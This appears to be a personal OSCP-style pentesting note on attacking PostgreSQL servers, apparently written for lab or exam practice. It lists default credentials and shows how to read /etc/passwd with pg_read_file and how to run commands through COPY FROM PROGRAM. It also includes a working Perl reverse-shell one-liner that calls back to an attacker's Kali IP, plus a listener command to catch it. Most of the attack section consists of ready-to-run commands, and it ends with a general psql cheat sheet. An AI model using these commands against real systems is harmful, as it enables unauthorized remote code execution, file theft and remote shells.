Manual page (https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546#psql

[PostgreSQL RCE](https://github.com/squid22/PostgreSQL_RCE?source=post_page-----6560a2a51947---------------------------------------)

https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/pentesting-postgresql

[Manual method RCE](https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767)

Magic words
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `psql -h ${ip} -U postgres -p 5432`;

dv.paragraph("```bash\n" + command + "\n```");
```
Default Username & Passwords:  
● postgres : postgres  
● postgres : password  
● postgres : admin  
● admin : admin  
● admin : password

---

NOTE: Press Q to back, do not upgrade shell

```
\du+
```

                                    List of roles
 Role name |                         Attributes                         | Description 
-----------+------------------------------------------------------------+-------------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | 


Listing all the available databases, we observe the presence of the cozyhosting database

```
\list
``` 

![[Pasted image 20260302222749.png]]

We connect to the database by utilizing the \connect directive.

```
\connect cozyhosting
```

![[Pasted image 20260302222830.png]]

Once we've successfully connected to the database, we can use the \dt command to list all the available tables within the database.

```
\dt
```

![[Pasted image 20260302222901.png]]

We proceed by utilizing the SELECT statement to view all the data present in the users table.

```
select * from users;
```

![[Pasted image 20260302222941.png]]

---

## As SUPERUSER

Reading files and listing directories :

```
select * from pg_read_file('/etc/passwd', 0, 1000000);
```

```
select * from pg_ls_dir('/tmp');
```

```
select * from pg_ls_dir('/');
```

## RCE commands

Prevents conflicts or errors when trying to create a table that already exists
```
DROP TABLE IF EXISTS cmd_exec;
```

Creates a table named cmd_exec with one column cmd_output of type text.This table will store the output of the executed command
```  
CREATE TABLE cmd_exec(cmd_output text);
```

Executes the id command on the server and inserts the output into the cmd_exec table
```  
COPY cmd_exec FROM PROGRAM 'id';
```
 
 Displays the output stored in the cmd_exec table  
``` 
SELECT * FROM cmd_exec;
```

Deletes the cmd_exec table once it has served its purpose
```
DROP TABLE IF EXISTS cmd_exec;
```

## Final Steps

On KALI ATTACKER
```
cd ~/Desktop/Tools && python3 penelope.py -p 8080 -O / --oscp-safe
```

Back on VICTIM HOST PSQL
```
DROP TABLE IF EXISTS cmd_exec;
```

```
CREATE TABLE cmd_exec(cmd_output text);
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${KaliIP}:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';`;

dv.paragraph("```bash\n" + command + "\n```");
```

---

Some interesting flags (to see all, use `-h` or `--help` depending on your psql version):

- `-E`: will describe the underlaying queries of the `\` commands (cool for learning!)
- `-l`: psql will list all databases and then exit (useful if the user you connect with doesn't has a default database, like at AWS RDS)

Most `\d` commands support additional param of `__schema__.name__` and accept wildcards like `*.*`

- `\?`: Show help (list of available commands with an explanation)
- `\q`: Quit/Exit
- `\c __database__`: Connect to a database
- `\d __table__`: Show table definition (columns, etc.) including triggers
- `\d+ __table__`: More detailed table definition including description and physical disk size
- `\l`: List databases
- `\dy`: List events
- `\df`: List functions
- `\di`: List indexes
- `\dn`: List schemas
- `\dt *.*`: List tables from all schemas (if `*.*` is omitted will only show SEARCH_PATH ones)
- `\dT+`: List all data types
- `\dv`: List views
- `\dx`: List all extensions installed
- `\df+ __function__` : Show function SQL code.
- `\x`: Pretty-format query results instead of the not-so-useful ASCII tables
- `\copy (SELECT * FROM __table_name__) TO 'file_path_and_name.csv' WITH CSV`: Export a table as CSV
- `\des+`: List all foreign servers
- `\dE[S+]`: List all foreign tables
- `\! __bash_command__`: execute `__bash_command__` (e.g. `\! ls`)

User Related:

- `\du`: List users
- `\du __username__`: List a username if present.
- `create role __test1__`: Create a role with an existing username.
- `create role __test2__ noinherit login password __passsword__;`: Create a role with username and password.
- `set role __test__;`: Change role for current session to `__test__`.
- `grant __test2__ to __test1__;`: Allow `__test1__` to set its role as `__test2__`.
- `\deu+`: List all user mapping on server